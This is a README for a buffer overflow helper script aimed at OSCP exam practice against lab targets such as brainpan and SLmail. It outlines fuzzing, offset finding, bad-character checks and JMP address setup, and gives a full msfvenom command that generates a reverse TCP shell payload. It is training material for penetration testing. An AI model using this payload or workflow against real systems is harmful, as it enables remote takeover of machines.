# Buffer Overflow Assistant 2 (BOA2) 
## What is this

This was originally built to assist with Windows Buffer Overflows, primarily for the OSCP Exam. It has been updated by Rob Hughes (Independent Info-Sec Consultants) to be more stable and easier to use for the exam. 

## What it does

This provides a menu with options from 1-7 which allow you to execute certain tasks in the correct oder.  

Example - fire a for loop of A's to find out how many crash the service.  
Example - send bad characters, you can then manually check to see what needs to be removed
Example - utilises patternCreate to find the offset value.

## How to Use
The script will need modifying, there sections that need to be modified are commented out in the script. This is typically where the unique PoC causing the overflow will need to be written to.

The following elements need to be updated

### 1. The JMP or equiv address (the old script only looked for a JMP address, which may not exist)

### 2. The shell code - the original would crash most executables as it didn't exit on a thread. If your executable is a windows app running on Linux - just update the schell code to use this 

msfvenom -p linux/x86/shell/reverse_tcp LHOST=IP_Address LPORT=4444 EXITFUNC=thread -b "\bad_characters" -f c -a x86

### 3. The bad characters - a Better explanation on how to do this using the mona script. 

It's not designed to work on modern executables using DEP etc, this has been tested and works with brainpan and with modification, will work with SLmail (which are the types of executables you will find on the OSCP, pretty simple really) 

It should take you about 30 minutes to an hour to complete the buffer overflow rig, leaving you more time to try harder on the other rigs ..... 

